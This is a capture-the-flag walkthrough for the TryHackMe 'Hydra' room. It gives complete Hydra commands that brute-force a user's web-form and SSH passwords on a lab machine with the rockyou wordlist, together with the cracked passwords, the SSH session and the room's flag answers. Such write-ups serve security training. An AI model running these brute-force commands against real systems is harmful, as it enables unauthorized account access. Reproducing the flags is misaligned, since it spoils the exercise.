# TryHackMe [Hydra](https://www.tryhackme.com/room/hydra)
### References
* DarkSec. (2020). TryHackMe Hydra Official Walkthrough [YouTube Video]. In YouTube. https://youtu.be/8fs_7bm88GY
## Use Hydra to brute force molly's web password. What is flag 1?
1. Brute force Molly's password with `hydra`:
```bash
$ hydra -l molly -P rockyou.txt 10.10.66.163 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-10 21:00:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.66.163:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect.
[80][http-post-form] host: 10.10.66.163   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-10 21:00:40
```
2. Login to the webpage with the credentials

**Flag 1**: `THM{2673a7dd116de68e85c48ec0b1f2612e}`
## Use Hydra to brute force molly's SSH password. What is flag 2?

```bash
$ hydra -l molly -P rockyou.txt 10.10.66.163 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-10 21:03:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.66.163:22/
[22][ssh] host: 10.10.66.163   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-10 21:03:24
```

```
$  ssh molly@10.10.66.163

molly@10.10.66.163's password: butterfly
molly@ip-10-10-66-163:~$ ls
flag2.txt
molly@ip-10-10-66-163:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
```